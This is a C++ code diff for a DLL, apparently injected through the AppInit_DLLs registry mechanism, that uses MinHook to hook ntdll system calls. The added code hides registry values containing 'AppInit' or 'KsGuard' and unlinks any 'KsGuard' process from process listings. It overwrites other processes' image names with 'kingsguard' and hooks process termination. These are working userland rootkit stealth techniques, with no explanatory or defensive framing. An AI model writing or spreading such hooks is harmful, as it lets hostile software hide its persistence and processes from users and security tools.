@@ -12,7 +12,7 @@ NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNam
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
         // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (w_name.find(L"Appinit") != std::wstring::npos)
+        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"KsGuard") != std::wstring::npos)
             return STATUS_OBJECT_NAME_NOT_FOUND;
     }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
@@ -30,7 +30,7 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
 
             std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
             // std::transform(w_name.begin(), w_name.end(), ::tolower);
-            if (name.find(L"AppInit") == std::wstring::npos)
+            if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
             {
                 newIndex++;
             }
@@ -62,67 +62,49 @@ NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
     return 1;
 }
 
-NTSTATUS WINAPI HookedNtQuerySystemInformation(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID SystemInformation,
-    ULONG SystemInformationLength,
-    PULONG ReturnLength)
+NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    NTSTATUS status = OriginalNtQuerySystemInformation(
-        SystemInformationClass,
-        SystemInformation,
-        SystemInformationLength,
-        ReturnLength);
+    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
     if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
     {
         PMY_SYSTEM_PROCESS_INFORMATION prev = PMY_SYSTEM_PROCESS_INFORMATION(SystemInformation);
         PMY_SYSTEM_PROCESS_INFORMATION curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
 
-        while (prev->NextEntryOffset != NULL)
+        while (prev->NextEntryOffset != 0)
         {
-            WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
+            std::wstring w_name = std::wstring(curr->ImageName.Buffer);
+            if (w_name.find(L"KsGuard") != std::wstring::npos)
+            {
+                if (curr->NextEntryOffset == 0)
+                    prev->NextEntryOffset = 0;
+                else
+                    prev->NextEntryOffset += curr->NextEntryOffset;
+                curr = prev;
+            }
+            else
+            {
+                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
+            }
             prev = curr;
             curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
         }
     }
-
     return status;
 }
 
 bool InstallHook()
 {
     OutputDebugStringA("installing hooks");
-    if (MH_Initialize() != MH_OK)
-    {
-        return false;
-    }
+    if (MH_Initialize() != MH_OK) { return false; }
 
-    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID *>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID *>(&OriginalNtQuerySystemInformation)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID *>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID *>(&OriginalNtTerminateProcess)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID *>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID *>(&OriginalNtEnumerateValueKey)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID *>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID *>(&OriginalNtQueryValueKey)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtOpenFile", reinterpret_cast<LPVOID *>(&HookedNtOpenFile), reinterpret_cast<LPVOID *>(&OriginalNtOpenFile)) != MH_OK)
-    {
-        return false;
-    }
+    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID*>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID*>(&OriginalNtTerminateProcess)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID*>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID*>(&OriginalNtEnumerateValueKey)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID*>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID*>(&OriginalNtQueryValueKey)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtOpenFile", reinterpret_cast<LPVOID*>(&HookedNtOpenFile), reinterpret_cast<LPVOID*>(&OriginalNtOpenFile)) != MH_OK) { return false; }
 
-    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
-    {
-        return false;
-    }
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return false; }
 
     return true;
 }
